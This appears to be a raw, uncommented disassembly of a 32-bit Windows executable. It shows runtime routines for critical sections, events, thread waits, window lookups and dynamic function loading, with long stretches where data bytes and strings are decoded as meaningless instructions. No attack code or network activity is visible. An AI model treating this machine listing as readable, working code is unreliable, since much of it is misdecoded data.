add [ eax + 0x43e6 ] dh
add [ eax ] al
add ah bl
out 0x43 al
add [ eax + eax ] dl
add [ eax ] al
in al 0x43
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ edi + ebp * 8 + 0x43 ] ah
add [ eax ] bl
out dx eax
inc ebx
add [ edi + ebp * 8 ] bl
inc ebx
add [ edi + ebp * 8 + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add eax edi
add [ ebx + edx * 2 ] al
inc ebp
jb r-xdata
insb
add al [ eax ]
add [ ecx + 0x10043 ] edi
pop es
push esp
imul ebp [ ebp + 0x65 ] 0x274756f
add [ edx ] al
add [ eax + 0x43f12c00 ] bl
add [ edi ] cl
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] 0x6c754d72
je r-xdata
jb r-xdata
insb
add al [ eax ]
add al 0x53
outsd
jb r-xdata
or dl [ ebp + 0x73 ]
inc ebx
jo r-xdata
add [ ebx + edx * 2 ] al
jns r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
or eax [ esi + 0x55 ]
jae r-xdata
add [ ecx ] al
add [ eax + 0x43ea ] al
add [ eax ] al
add [ eax ] bh
jmp r-xdata
arpl [ edi + 0x62 ] cx
push 0x73
add [ eax ] al
add al [ eax ]
add cl [ esi + 0x20043e8 ]
add [ edx ] al
mov dl 0xe8
inc ebx
add [ edx ] al
add [ edx ] al
add [ eax + edx + 0x80040 ] bl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
dec ebp
push edi
popad
imul esi [ edx + eax ] 0x40109c00
add [ eax ] cl
add [ ebx ] al
dec esp
outsb
add al [ eax ]
add al [ eax ]
nop
pop eax
call 0xd4ae89d
push esp
dec eax
popad
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 2 - 0x1a ] si
inc ebx
add [ eax ] bh
in eax 0x43
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
add eax [ gs : eax ]
push 0x180043e5
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
in eax 0x43
add [ ecx ] al
add [ edx ] cl
dec eax
popad
outsb
insb
dec edi
bound ebp [ edx + 0x73 ]
add al [ eax ]
add al bh
adc [ eax ] al
add al [ eax ]
pop es
push esp
imul ebp [ ebp + 0x65 ] 0x274756f
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] dl
add al 0x41
inc ecx
insb
insb
add al [ eax ]
and [ eax + ebp * 8 + 0x43 ] edx
add [ eax ] dl
add [ ebx ] cl
push ebx
imul esp [ edi + 0x6e ] 0x64656c61
dec edi
bound ebp [ edx + 0x2 ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
or [ eax ] al
add [ eax ] eax
push esp
call sub_43e785
add al 0x53
insb
add al [ eax ]
add al [ eax ]
cmp [ eax ] al
xchg esp eax
out dx eax
inc ebx
add [ edi ] al
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] 0x68000372
in eax 0x43
add [ eax ] cl
add [ edx ] al
add [ eax + ebp * 8 + 0x43 ] dl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al bh
adc [ eax ] al
add [ eax ] eax
pop es
push esp
imul ebp [ ebp + 0x65 ] 0x274756f
add [ edx ] al
add [ eax ] bh
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax + ebp * 8 + 0x43 ] dl
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
adc [ eax ] al
add al [ eax ]
or dl [ ebp + 0x73 ]
inc ebx
dec edi
dec ebp
push edi
popad
imul esi [ edx + eax ] 0x270002
out dx eax
inc ebx
add [ edi ] al
inc esp
jae r-xdata
add al [ eax ]
inc ebx
dec edi
dec ebp
push edi
popad
imul esi [ edx + eax ] 0x50000
0x440043e6 0xf400
out dx eax
inc ebx
add [ eax ] al
add [ eax + eax ] al
arpl cx bp
inc ebx
add [ eax + eax - 0xc ] al
sub_43e785
sub al dh
inc ebx
add [ edi ] al
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] 0x68000372
in eax 0x43
add [ eax ] cl
add [ edx ] al
add [ eax + ebp * 8 + 0x43 ] dl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + 0x10043 ] edi
pop es
push esp
imul ebp [ ebp + 0x65 ] 0x274756f
add [ edx ] al
add [ eax + 0x43f12c00 ] bl
add [ edi ] cl
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] 0x6c754d72
je r-xdata
or dl [ ebp + 0x73 ]
inc ebx
jo r-xdata
add [ eax + 0x43ea ] al
add [ eax ] al
add [ eax ] bh
jmp r-xdata
arpl [ edi + 0x62 ] cx
push 0x73
add [ eax ] al
add al [ eax ]
add cl [ esi + 0x20043e8 ]
add [ edx ] al
mov dl 0xe8
inc ebx
add [ edx ] al
add [ edx ] al
add [ eax + edx + 0x80040 ] bl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
dec ebp
push edi
popad
imul esi [ edx + eax ] 0x40109c00
add [ eax ] cl
add [ ebx ] al
dec esp
outsb
add al [ eax ]
add al [ eax ]
nop
pop eax
call 0xd4ae89d
push esp
dec eax
popad
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 2 - 0x1a ] si
inc ebx
add [ eax ] bh
in eax 0x43
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
add eax [ gs : eax ]
push 0x180043e5
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
in eax 0x43
add [ ecx ] al
add [ edx ] cl
dec eax
popad
outsb
insb
dec edi
bound ebp [ edx + 0x73 ]
add al [ eax ]
add al bh
adc [ eax ] al
add al [ eax ]
pop es
push esp
imul ebp [ ebp + 0x65 ] 0x274756f
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] dl
add al 0x41
inc ecx
insb
insb
add al [ eax ]
and [ eax + ebp * 8 + 0x43 ] edx
add [ eax ] dl
add [ ebx ] cl
push ebx
imul esp [ edi + 0x6e ] 0x64656c61
dec edi
bound ebp [ edx + 0x2 ]
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] cl
out dx eax
inc ebx
add [ eax ] al
add [ eax + eax ] al
arpl cx bp
inc ebx
add [ eax + eax - 0xc ] al
sub_43ea8e
inc ebx
add [ eax ] al
add [ eax ] cl
push ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] ebp
scasb [ edi ]
inc eax
add [ eax + eax ] al
add [ eax ] al
or [ esi + 0x53 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al [ eax ]
add [ eax ] al
pop es
add [ ebp - 0x15 ] ch
inc ebx
add [ eax + eax - 0xc ] al
call [ ebx + 0x4d0043eb ]
add bh bh
arpl [ edi + 0x62 ] cx
push 0x73
add [ eax ] al
add [ eax ] al
add al [ eax ]
lea eax [ eax ]
cld
0x43 0x0
sub_43eabf
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 + 0x43 ] bl
add [ eax ] ah
add [ eax ] al
add [ esp + 0x43 ] ah
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al dl
inc ebx
add [ eax ] al
hlt
sub_43eb02
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ecx ] al
sub [ esi + 0x40040 ] ch
add [ eax ] al
or [ esi + 0x53 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al [ eax ]
add [ eax ] al
pop es
add [ ebp - 0x15 ] ch
inc ebx
add [ eax + eax - 0xc ] al
call [ ebx + 0x4d0043eb ]
add bh bh
sub_43eb34
mov edx 0x4a0043eb
add [ eax ] al
add cl ah
jmp r-xdata
add [ eax ] eax
jl r-xdata
add [ esi ] al
inc ebx
jb r-xdata
inc ebx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
daa
add al dl
inc ebx
add [ edi ] al
add al [ eax ]
popad
je r-xdata
inc ebp
outsb
je r-xdata
jb r-xdata
add [ 0x43f43400 ] ah
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
jl r-xdata
add al [ eax ]
daa
add [ esp + esi * 8 ] cl
inc ebx
add [ edi ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
rol [ eax + 0x70043ec ] 0x10
push esp
inc ebx
jb r-xdata
jb r-xdata
push esp
jb r-xdata
jns r-xdata
add [ 0x7661654c ] al
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
jl r-xdata
inc ebx
inc ebx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
sub ah 0x43
add [ edi ] al
adc [ ebx + eax * 2 + 0x72 ] dl
imul esi [ ecx + ebp * 2 + 0x63 ] 0x65536c61
arpl [ ecx + ebp * 2 + 0x6f ] si
push edx
insb
popad
jae r-xdata
pop es
inc ebx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] al
sbb ah dh
inc ebx
add [ eax ] cl
xor ebx ebx
je r-xdata
inc eax
add [ eax ] cl
add [ ecx ] al
add [ esp + ebp * 8 + 0x43 ] bh
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
jl r-xdata
outsb
cld
0xe5380043 0x43
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add [ eax ] al
or [ eax ] al
add [ eax ] eax
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ esp + ebp * 8 + 0x43 ] bh
call sub_40a7e8
mov eax [ eax + 0x14 ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_40a7e8
mov eax [ eax + 0x14 ]
push eax
call __imp_GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExW
mov ebx eax
call sub_40a7e8
mov [ eax + 0x14 ] ebx
call sub_40a7e8
mov ebx [ eax + 0x14 ]
call sub_40a7e8
cmp [ eax + 0x14 ] 0x0
je r-xdata
arpl [ ecx + 0x6c ] sp
add [ eax ] al
or [ eax ] al
add [ eax ] eax
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ esp + ebp * 8 + 0x43 ] bh
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
and eax 0x43f42c00
inc ebx
inc esp
jae r-xdata
pop es
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
daa
add [ eax ] al
hlt
inc ebx
add [ 0x65746e45 ] al
jb r-xdata
inc ebx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
and eax 0x43f43400
inc ebx
sub_43ecac
push ebx
push esi
push edi
call sub_40a7e8
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
call sub_40a7e8
mov eax [ eax + 0x14 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor esi esi
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
call sub_40a7e8
mov eax [ eax + 0x14 ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_40a7e8
mov eax [ eax + 0x14 ]
push eax
call __imp_GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
mov esi 0xfffffffd
jmp r-xdata
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExW
mov ebx eax
call sub_40a7e8
mov [ eax + 0x14 ] ebx
call sub_40a7e8
mov ebx [ eax + 0x14 ]
call sub_40a7e8
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor ebx ebx
sub_43ee64
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
pop ebx
retn
mov [ rw-data ] r-xdata
sub_43eee4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push ebx
call [ rw-data ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_43ee64
sub_43ef20
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov [ esi + 0xc ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43ef64
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
push eax
call CloseHandle
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_43ef94
push ebx
push esi
push ecx
mov esi eax
cmp [ esi + 0xc ] 0x0
je r-xdata
push 0x0
push edx
push 0xffffffff
lea eax [ esi + 0x4 ]
push eax
push 0x1
call WaitForMultipleObjectsEx
sub eax 0xffffffff
je r-xdata
lea eax [ esi + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx 0x1
xor eax eax
call sub_43eee4
sub eax 0x80010115
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
dec eax
je r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0xa
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
sub eax 0x80
je r-xdata
mov bl 0x1
jmp r-xdata
sub eax 0x7ffefee1
jne r-xdata
mov bl 0x2
jmp r-xdata
sub eax 0x82
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
jmp r-xdata
mov bl 0x3
sub_43f028
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f0e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43e200
call sub_404644
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jb r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_43e1ec
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp - 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f0ea
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
jmp r-xdata
sub_43f0f6
inc ebx
add [ ecx ] dl
adc [ edx ] edi
push esp
dec eax
popad
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esi + ebp + 0x3a ] si
xor [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
clc
adc [ eax ] al
or [ ebx + 0x79 ] dl
outsb
arpl [ edi + 0x62 ] cx
push 0x73
clc
adc [ eax ] al
add al [ eax ]
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43f2ba
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jle r-xdata
mov eax ebx
call sub_408754
mov edi eax
mov eax ebx
call sub_408754
cmp eax edi
jle r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
inc edx
xor eax eax
mov edi eax
jmp r-xdata
mov eax edi
push 0x0
push esi
cmp [ ebp + 0x14 ] 0x1
cmc
sbb eax eax
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_408754
push eax
call WaitForMultipleObjectsEx
mov edx eax
cmp edx 0x80
jge r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebx + eax * 4 ]
mov ecx [ ecx + 0x4 ]
mov edi [ ebp - 0x4 ]
mov [ edi + eax * 4 ] ecx
inc eax
dec edx
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ ebp - 0x4 ]
call sub_40875c
mov edx eax
test edx edx
jl r-xdata
add edx 0xffffff80
sub edx 0x40
jb r-xdata
sub edx 0xffffffff
je r-xdata
xor edi edi
mov edi 0x1
jmp r-xdata
mov [ ebp - 0x5 ] 0x2
mov eax [ ebx + eax * 4 - 0x200 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
jmp r-xdata
je r-xdata
mov [ ebp - 0x5 ] 0x3
jmp r-xdata
dec edx
sub edx 0x40
jb r-xdata
mov [ ebp - 0x5 ] 0x4
jmp r-xdata
sub eax 0xa
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_408754
mov ecx eax
mov edx esi
mov eax edi
call sub_43eee4
sub eax 0x80010115
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f2c1
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
mov [ ebp - 0x5 ] 0x4
jmp r-xdata
sub edx 0x42
je r-xdata
mov [ ebp - 0x5 ] 0x0
mov eax [ ebx + eax * 4 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub eax 0x7ffefee1
jne r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x5 ] 0x3
mov eax [ ebp + 0x10 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] 0x3
mov [ ebp - 0x5 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ ebx + eax * 4 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
jmp r-xdata
sub_43f2d0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_43ef20
mov eax [ ebp + 0xc ]
call sub_407134
push eax
cmp [ ebp + 0x10 ] 0x1
cmc
sbb eax eax
push eax
cmp [ ebp + 0x14 ] 0x1
cmc
sbb eax eax
push eax
push esi
call CreateEventW
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43f338
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x1
push 0x0
push 0x0
push ecx
xor edx edx
mov eax esi
xor ecx ecx
call sub_43f2d0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43f390
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43f3d0
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_43f488
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43f4fc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43f4d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43f4e0
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f4d8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_43f74c
retn
sub_43f4e0
mov eax [ edx ]
test eax eax
je r-xdata
xor ecx ecx
mov [ edx ] ecx
retn
cmp eax [ eax ]
jne r-xdata
mov eax [ edx ]
mov ecx [ eax ]
mov eax ecx
mov ecx [ ecx ]
mov edx [ edx ]
mov [ edx ] ecx
retn
sub_43f4fc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
mov eax [ rw-data ]
cmp [ eax ] 0x1
setg [ esp ]
cmp [ esp ] 0x0
je r-xdata
or edi 0xffffffff
mov edi 0xfa0
jmp r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
jge r-xdata
mov ebx [ ebp ]
and ebx 0xfffffffe
mov esi ebx
push esi
mov eax esi
or eax 0x1
push eax
push ebp
call InterlockedCompareExchange
cmp eax esi
je r-xdata
pause
call SwitchToThread
cmp [ esp ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edi 0xfa0
jmp r-xdata
dec edi
jmp r-xdata
sub_43f560
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43f4fc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f5ba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov [ ebx ] eax
mov eax [ ebp - 0xc ]
mov [ eax ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebx ] ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f5c1
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43f74c
retn
sub_43f5c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
and eax 0xfffffffe
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_43f4fc
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43f648
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ edx ]
cmp eax [ ebp - 0xc ]
je r-xdata
cmp eax [ ebp - 0xc ]
jne r-xdata
cmp eax ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43f74c
retn
cmp eax ebx
jne r-xdata
mov edx eax
mov eax [ eax ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax ]
mov [ edx ] ecx
jmp r-xdata
cmp eax [ eax ]
jne r-xdata
mov [ ebp - 0xc ] edx
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_43f654
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
call GetCurrentThreadId
cmp eax [ ebx + 0xc ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f735
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x8 ]
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_43f560
mov [ ebx + 0x8 ] 0x1
mov eax esi
dec eax
neg eax
push eax
lea eax [ ebx + 0x4 ]
push eax
call InterlockedExchangeAdd
push ebx
call LeaveCriticalSection
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call WaitForSingleObject
sub eax 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub eax 0x101
jne r-xdata
push ebx
call EnterCriticalSection
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_43f5c8
mov eax esi
dec eax
push eax
lea eax [ ebx + 0x4 ]
push eax
call InterlockedExchangeAdd
mov [ ebx + 0x8 ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
mov [ ebp - 0x5 ] 0x0
push 0x0
call SetLastError
mov [ ebp - 0x5 ] 0x0
push 0x5b4
call SetLastError
jmp r-xdata
sub_43f768
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43f4fc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f7cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43f4e0
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f7d6
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43f74c
retn
mov eax [ ebx + 0x8 ]
push eax
call SetEvent
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43f4e0
mov ebx eax
test ebx ebx
jne r-xdata
sub_43f7dc
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
pop ebx
retn
mov [ rw-data ] sub_43f43c
mov [ rw-data ] sub_43f44c
mov [ rw-data ] sub_43f45c
mov [ rw-data ] sub_43f46c
pop ebx
retn
sub_43f9b0
push ebp
mov ebp esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor edx edx
push ebp
push sub_43fb66
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb6d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
